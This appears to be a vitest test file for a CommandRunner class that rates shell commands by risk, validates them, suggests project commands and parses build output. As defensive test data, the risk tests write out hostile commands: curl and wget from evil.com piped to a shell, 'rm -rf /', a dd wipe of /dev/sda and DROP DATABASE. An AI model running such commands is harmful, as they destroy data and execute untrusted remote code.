import { describe, it, expect, beforeEach } from 'vitest'
import { CommandRunner } from '../CommandRunner.js'
import type {
  SuggestedCommand,
  CommandOutput,
  ProjectConfig,
  CommandSequence,
} from '../CommandRunner.js'

describe('CommandRunner', () => {
  let runner: CommandRunner

  beforeEach(() => {
    runner = new CommandRunner()
  })

  // ═══════════════════════════════════════════════════════════
  // assessRisk
  // ═══════════════════════════════════════════════════════════

  describe('assessRisk', () => {
    it('should flag rm -rf / as destructive', () => {
      expect(runner.assessRisk('rm -rf /')).toBe('destructive')
    })

    it('should flag rm -rf ~ as destructive', () => {
      expect(runner.assessRisk('rm -rf ~')).toBe('destructive')
    })

    it('should flag rm -rf * as destructive', () => {
      expect(runner.assessRisk('rm -rf *')).toBe('destructive')
    })

    it('should flag curl piped to bash as destructive', () => {
      expect(runner.assessRisk('curl https://evil.com | bash')).toBe('destructive')
    })

    it('should flag wget piped to sh as destructive', () => {
      expect(runner.assessRisk('wget https://evil.com | sh')).toBe('destructive')
    })

    it('should flag dd if= as destructive', () => {
      expect(runner.assessRisk('dd if=/dev/zero of=/dev/sda')).toBe('destructive')
    })

    it('should flag chmod -R 777 as destructive', () => {
      expect(runner.assessRisk('chmod -R 777 /var')).toBe('destructive')
    })

    it('should flag rm -rf as dangerous', () => {
      expect(runner.assessRisk('rm -rf dist/')).toBe('dangerous')
    })

    it('should flag git push --force as dangerous', () => {
      expect(runner.assessRisk('git push --force')).toBe('dangerous')
    })

    it('should flag git reset --hard as dangerous', () => {
      expect(runner.assessRisk('git reset --hard HEAD~3')).toBe('dangerous')
    })

    it('should flag DROP DATABASE as dangerous', () => {
      expect(runner.assessRisk('DROP DATABASE production')).toBe('dangerous')
    })

    it('should flag npm publish as dangerous', () => {
      expect(runner.assessRisk('npm publish')).toBe('dangerous')
    })

    it('should flag git push as moderate', () => {
      expect(runner.assessRisk('git push origin main')).toBe('moderate')
    })

    it('should flag npm install as moderate', () => {
      expect(runner.assessRisk('npm install lodash')).toBe('moderate')
    })

    it('should flag docker run as moderate', () => {
      expect(runner.assessRisk('docker run nginx')).toBe('moderate')
    })

    it('should rate npm test as safe', () => {
      expect(runner.assessRisk('npm test')).toBe('safe')
    })

    it('should rate npm run build as safe', () => {
      expect(runner.assessRisk('npm run build')).toBe('safe')
    })

    it('should rate ls as safe', () => {
      expect(runner.assessRisk('ls -la')).toBe('safe')
    })

    it('should rate echo as safe', () => {
      expect(runner.assessRisk('echo hello')).toBe('safe')
    })
  })

  // ═══════════════════════════════════════════════════════════
  // validateCommand
  // ═══════════════════════════════════════════════════════════

  describe('validateCommand', () => {
    it('should reject empty commands', () => {
      const result = runner.validateCommand('')
      expect(result.safe).toBe(false)
      expect(result.issues).toContain('Empty command')
    })

    it('should flag destructive patterns', () => {
      const result = runner.validateCommand('rm -rf /')
      expect(result.safe).toBe(false)
      expect(result.issues.length).toBeGreaterThan(0)
    })

    it('should flag pipe to shell', () => {
      const result = runner.validateCommand('echo test | bash')
      expect(result.safe).toBe(false)
      expect(result.issues.some(i => i.includes('Piping to shell'))).toBe(true)
    })

    it('should flag sudo', () => {
      const result = runner.validateCommand('sudo apt install git')
      expect(result.safe).toBe(false)
      expect(result.issues.some(i => i.includes('sudo'))).toBe(true)
    })

    it('should flag command substitution', () => {
      const result = runner.validateCommand('echo $(whoami)')
      expect(result.safe).toBe(false)
      expect(result.issues.some(i => i.includes('command substitution'))).toBe(true)
    })

    it('should flag complex command chains', () => {
      const result = runner.validateCommand('a && b && c && d && e && f && g')
      expect(result.issues.some(i => i.includes('Complex command chain'))).toBe(true)
    })

    it('should pass safe commands', () => {
      const result = runner.validateCommand('npm test')
      expect(result.safe).toBe(true)
      expect(result.issues).toHaveLength(0)
    })

    it('should pass simple git commands', () => {
      const result = runner.validateCommand('git status')
      expect(result.safe).toBe(true)
    })
  })

  // ═══════════════════════════════════════════════════════════
  // suggestCommands
  // ═══════════════════════════════════════════════════════════

  describe('suggestCommands', () => {
    it('should suggest test commands for "run tests"', () => {
      const suggestions = runner.suggestCommands('run tests')
      expect(suggestions.length).toBeGreaterThan(0)
      expect(suggestions[0].category).toBe('test')
    })

    it('should suggest build commands for "build the project"', () => {
      const suggestions = runner.suggestCommands('build the project')
      expect(suggestions.length).toBeGreaterThan(0)
      expect(suggestions[0].category).toBe('build')
    })

    it('should suggest install commands for "install dependencies"', () => {
      const suggestions = runner.suggestCommands('install dependencies')
      expect(suggestions.length).toBeGreaterThan(0)
      expect(suggestions[0].category).toBe('install')
    })

    it('should suggest lint commands for "lint code"', () => {
      const suggestions = runner.suggestCommands('lint code')
      expect(suggestions.length).toBeGreaterThan(0)
      expect(suggestions[0].category).toBe('lint')
    })

    it('should suggest yarn commands when packageManager is yarn', () => {
      const suggestions = runner.suggestCommands('run tests', { packageManager: 'yarn' })
      expect(suggestions.some(s => s.command.includes('yarn'))).toBe(true)
    })

    it('should suggest pnpm commands when packageManager is pnpm', () => {
      const suggestions = runner.suggestCommands('install dependencies', { packageManager: 'pnpm' })
      expect(suggestions.some(s => s.command.includes('pnpm'))).toBe(true)
    })

    it('should return empty for unmatched queries', () => {
      const suggestions = runner.suggestCommands('make coffee')
      expect(suggestions).toHaveLength(0)
    })

    it('should set requiresConfirmation for non-safe commands', () => {
      const suggestions = runner.suggestCommands('install dependencies')
      const installCmd = suggestions.find(s => s.category === 'install')
      expect(installCmd?.requiresConfirmation).toBe(true)
    })

    it('should not require confirmation for safe commands', () => {
      const suggestions = runner.suggestCommands('run tests')
      const testCmd = suggestions.find(s => s.category === 'test')
      expect(testCmd?.requiresConfirmation).toBe(false)
    })

    it('should suggest git status for "status"', () => {
      const suggestions = runner.suggestCommands('git status')
      expect(suggestions.some(s => s.command === 'git status')).toBe(true)
    })
  })

  // ═══════════════════════════════════════════════════════════
  // parseOutput
  // ═══════════════════════════════════════════════════════════

  describe('parseOutput', () => {
    it('should parse TypeScript errors', () => {
      const output = 'src/index.ts(10,5): error TS2322: Type string is not assignable to type number'
      const result = runner.parseOutput(output, 1)
      expect(result.success).toBe(false)
      expect(result.errors.length).toBeGreaterThan(0)
      expect(result.errors[0].type).toBe('typescript')
      expect(result.errors[0].filePath).toBe('src/index.ts')
      expect(result.errors[0].line).toBe(10)
    })

    it('should parse ESLint errors', () => {
      const output = 'src/app.ts:5:10 error no-unused-vars'
      const result = runner.parseOutput(output, 1)
      expect(result.errors.length).toBeGreaterThan(0)
      expect(result.errors[0].type).toBe('eslint')
    })

    it('should parse Node.js errors', () => {
      const output = 'TypeError: Cannot read properties of undefined'
      const result = runner.parseOutput(output, 1)
      expect(result.errors.length).toBeGreaterThan(0)
      expect(result.errors[0].type).toBe('runtime')
    })

    it('should parse warnings', () => {
      const output = 'src/app.ts:3:1 warning no-console'
      const result = runner.parseOutput(output, 0)
      expect(result.warnings.length).toBeGreaterThan(0)
    })

    it('should detect npm warnings', () => {
      const output = 'npm WARN deprecated package@1.0.0'
      const result = runner.parseOutput(output, 0)
      expect(result.warnings.length).toBeGreaterThan(0)
    })

    it('should report success for exit code 0', () => {
      const result = runner.parseOutput('All tests passed', 0)
      expect(result.success).toBe(true)
      expect(result.summary).toContain('successfully')
    })

    it('should report failure for non-zero exit code', () => {
      const result = runner.parseOutput('Error: something failed', 1)
      expect(result.success).toBe(false)
      expect(result.summary).toContain('failed')
    })

    it('should suggest npm install for missing module errors', () => {
      const output = 'Error: Cannot find module lodash'
      const result = runner.parseOutput(output, 1)
      expect(result.suggestedFixes).toContain('npm install')
    })

    it('should suggest checking permissions for EACCES', () => {
      const output = 'Error: permission denied EACCES'
      const result = runner.parseOutput(output, 1)
      expect(result.suggestedFixes.some(f => f.includes('permission'))).toBe(true)
    })

    it('should deduplicate suggested fixes', () => {
      const output = 'Error: Cannot find module a\nError: Cannot find module b'
      const result = runner.parseOutput(output, 1)
      const npmInstallCount = result.suggestedFixes.filter(f => f === 'npm install').length
      expect(npmInstallCount).toBeLessThanOrEqual(1)
    })
  })

  // ═══════════════════════════════════════════════════════════
  // detectProjectConfig
  // ═══════════════════════════════════════════════════════════

  describe('detectProjectConfig', () => {
    it('should detect npm projects', () => {
      const config = runner.detectProjectConfig(['package.json', 'package-lock.json', 'src/index.ts'])
      expect(config.packageManager).toBe('npm')
    })

    it('should detect yarn projects', () => {
      const config = runner.detectProjectConfig(['package.json', 'yarn.lock'])
      expect(config.packageManager).toBe('yarn')
    })

    it('should detect pnpm projects', () => {
      const config = runner.detectProjectConfig(['package.json', 'pnpm-lock.yaml'])
      expect(config.packageManager).toBe('pnpm')
    })

    it('should detect bun projects', () => {
      const config = runner.detectProjectConfig(['package.json', 'bun.lockb'])
      expect(config.packageManager).toBe('bun')
    })

    it('should detect Python projects', () => {
      const config = runner.detectProjectConfig(['requirements.txt', 'setup.py'])
      expect(config.packageManager).toBe('pip')
    })

    it('should detect Rust projects', () => {
      const config = runner.detectProjectConfig(['Cargo.toml', 'src/main.rs'])
      expect(config.packageManager).toBe('cargo')
    })

    it('should detect Go projects', () => {
      const config = runner.detectProjectConfig(['go.mod', 'main.go'])
      expect(config.packageManager).toBe('go')
    })

    it('should detect TypeScript', () => {
      const config = runner.detectProjectConfig(['tsconfig.json', 'src/index.ts'])
      expect(config.hasTypeScript).toBe(true)
    })

    it('should detect Docker', () => {
      const config = runner.detectProjectConfig(['Dockerfile', 'docker-compose.yml'])
      expect(config.hasDocker).toBe(true)
    })

    it('should detect vitest as test runner', () => {
      const config = runner.detectProjectConfig(['vitest.config.ts', 'package.json'])
      expect(config.testRunner).toBe('vitest')
    })

    it('should detect jest as test runner', () => {
      const config = runner.detectProjectConfig(['jest.config.js', 'package.json'])
      expect(config.testRunner).toBe('jest')
    })

    it('should detect eslint as linter', () => {
      const config = runner.detectProjectConfig(['.eslintrc.json', 'package.json'])
      expect(config.linter).toBe('eslint')
    })

    it('should detect vite as build tool', () => {
      const config = runner.detectProjectConfig(['vite.config.ts', 'package.json'])
      expect(config.buildTool).toBe('vite')
    })

    it('should detect prettier as formatter', () => {
      const config = runner.detectProjectConfig(['.prettierrc', 'package.json'])
      expect(config.formatter).toBe('prettier')
    })
  })

  // ═══════════════════════════════════════════════════════════
  // generateSequence
  // ═══════════════════════════════════════════════════════════

  describe('generateSequence', () => {
    it('should generate setup sequence', () => {
      const seq = runner.generateSequence('setup from scratch', { hasTypeScript: true })
      expect(seq.steps.length).toBeGreaterThanOrEqual(3)
      expect(seq.steps[0].description).toContain('Install')
    })

    it('should generate deploy sequence', () => {
      const seq = runner.generateSequence('deploy to production')
      expect(seq.steps.length).toBeGreaterThanOrEqual(3)
      expect(seq.steps.some(s => s.description.includes('Test'))).toBe(true)
      expect(seq.steps.some(s => s.description.includes('Build'))).toBe(true)
    })

    it('should generate CI pipeline sequence', () => {
      const seq = runner.generateSequence('CI pipeline', { hasTypeScript: true })
      expect(seq.steps.some(s => s.description.includes('Type check'))).toBe(true)
    })

    it('should generate default build+test sequence', () => {
      const seq = runner.generateSequence('check everything')
      expect(seq.steps.length).toBeGreaterThanOrEqual(2)
    })

    it('should use correct package manager commands', () => {
      const seq = runner.generateSequence('setup', { packageManager: 'yarn' })
      expect(seq.steps.some(s => s.command.includes('yarn'))).toBe(true)
    })

    it('should include name and description', () => {
      const seq = runner.generateSequence('deploy')
      expect(seq.name).toBe('deploy')
      expect(seq.description).toContain('deploy')
    })

    it('should have reasonable total duration', () => {
      const seq = runner.generateSequence('deploy')
      expect(seq.totalDuration).toBeGreaterThan(0)
    })
  })

  // ═══════════════════════════════════════════════════════════
  // History
  // ═══════════════════════════════════════════════════════════

  describe('history', () => {
    it('should record commands', () => {
      runner.recordCommand('npm test', true, 'test')
      expect(runner.getHistory()).toHaveLength(1)
    })

    it('should track success/failure', () => {
      runner.recordCommand('npm test', true, 'test')
      runner.recordCommand('npm run build', false, 'build')
      const stats = runner.getHistoryStats()
      expect(stats.succeeded).toBe(1)
      expect(stats.failed).toBe(1)
    })

    it('should track categories', () => {
      runner.recordCommand('npm test', true, 'test')
      runner.recordCommand('npm run build', true, 'build')
      const stats = runner.getHistoryStats()
      expect(stats.byCategory['test']).toBe(1)
      expect(stats.byCategory['build']).toBe(1)
    })

    it('should respect max history limit', () => {
      const smallRunner = new CommandRunner({ maxHistory: 3 })
      smallRunner.recordCommand('cmd1', true)
      smallRunner.recordCommand('cmd2', true)
      smallRunner.recordCommand('cmd3', true)
      smallRunner.recordCommand('cmd4', true)
      expect(smallRunner.getHistory()).toHaveLength(3)
    })

    it('should clear history', () => {
      runner.recordCommand('npm test', true)
      runner.clearHistory()
      expect(runner.getHistory()).toHaveLength(0)
    })

    it('should return copy of history', () => {
      runner.recordCommand('npm test', true)
      const h1 = runner.getHistory()
      const h2 = runner.getHistory()
      expect(h1).not.toBe(h2)
    })
  })
})
